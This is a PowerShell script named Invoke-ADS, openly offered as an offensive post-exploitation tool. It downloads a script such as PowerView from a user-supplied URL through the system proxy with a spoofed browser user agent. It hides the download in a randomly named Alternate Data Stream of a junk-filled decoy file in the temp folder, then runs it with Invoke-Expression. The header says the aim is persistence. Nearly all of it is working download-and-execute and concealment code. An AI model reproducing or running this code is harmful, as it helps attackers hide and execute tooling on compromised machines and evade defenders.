<#
Invoke-ADS

A script to download a powershell tool such as PowerView, hide it within an randomly named Alternate Data Stream (ADS) of a randomly named file.
The downloaded script remains on the file system as part of the ADS of the randomly named file, thus achieving persistence, whaich could be further utilised.
The script needs to be ran . sourced for the time being as there is an issue when running invoke-expression, which doesn't import the modules.

#>

  $randomfilename = -join ((65..90) + (97..122) |
    Get-Random -Count 14 |
    ForEach-Object -Process {
      [char]$_
  })

  $ads = -join ((65..90) + (97..122) |
    Get-Random -Count 8 |
    ForEach-Object -Process {
      [char]$_
  })
    $set    = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!£$%^&*()_+}{[]#~'@;:".ToCharArray()
    $result = ''
    $Jitter = Get-Random -Minimum -50 -Maximum 50 #randomise the length of the added junk
    $length = Get-Random -Maximum 4096 -Minimum 256
    $RandomLength = $length - $Jitter
    for ($x = 0; $x -lt $RandomLength; $x++) 
    {
        $result += $set | Get-Random
    }
    $begin = "<#`n"
    $end = "`n#>`n"
    $junk = $begin+$result+$end

  $file = "$env:TEMP\$randomfilename" + '.txt'
 

  $uri = Read-Host -Prompt 'Please Enter the url to the file: '
  Set-Content -Path $file -Value $junk


  $ua = 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT; Windows NT 10.0; en-GB)'
  $IESettings = Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings'
  if ($IESettings.ProxyEnable -eq 1)
  {
    $Proxy = "http://$(($IESettings.ProxyServer.Split(';') | Where-Object -FilterScript {$_ -match 'ttp='
    
    }) -replace '.*=')"
    $request = Invoke-WebRequest -Uri $uri -UserAgent $ua -ProxyUseDefaultCredentials -Proxy $Proxy -UseBasicParsing
  }
  else 
  {
    $request = Invoke-WebRequest -Uri $uri -UserAgent $ua -UseBasicParsing
  }

  Add-Content -Encoding Byte -Path $file -Value $request.Content -Stream $ads
  $adspayload = Get-Content -Path $file -Stream $ads -Raw

  Write-Host 'The file created by this script is: ' $file
  Write-Host 'The Stream name created is: ' $ads
  Invoke-Expression -command $adspayload